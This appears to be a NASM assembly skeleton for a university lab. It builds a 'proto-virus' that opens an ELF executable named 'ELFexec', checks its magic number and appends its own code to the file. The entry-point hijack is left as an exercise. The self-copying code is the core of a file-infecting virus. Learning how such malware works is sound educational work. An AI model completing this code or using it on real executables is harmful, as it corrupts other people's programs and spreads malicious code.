%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

section .text

get_loc_start_func:
	call insert_loc_to_ecx2
insert_loc_to_ecx2:
	pop ecx
	ret

_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;++++++++
	%define fd ebp-4
	%define location_of_insert ebp-8
	%define s_top ebp-STK_RES
	;++++++++

	mov dword [s_top], esp

	;write message
	call get_loc
	mov dword [location_of_insert], ecx
	add ecx, 10
	write 0, ecx, 32

	;open the file
	mov ebx, dword [location_of_insert]
	add ebx, 2
	open ebx, RDWR, 0
	mov [fd], eax

	;check open
	cmp dword [fd], 0
	jg cont
		exit 0
cont:
	
	;check if it is an elf file
	read dword [fd], dword [s_top], 4
	cmp dword [s_top], 0x464c457f
	jne VirusExit

	;write to the end of the file
	lseek [fd], 0, SEEK_END
	call get_loc_start_func
	add ecx, 2
	mov eax, dword [location_of_insert]
	add eax, 0x3c
	;size to wirte
	sub eax, ecx
	write [fd], ecx, eax

	;close the file
	close [fd]

; You code for this lab goes here

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)	

get_loc:
	call insert_loc_to_ecx
insert_loc_to_ecx:
	pop ecx
	ret

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes! ", 10, 0
Failstr:        db "perhaps not", 10 , 0
	
PreviousEntryPoint: dd VirusExit
virus_end:


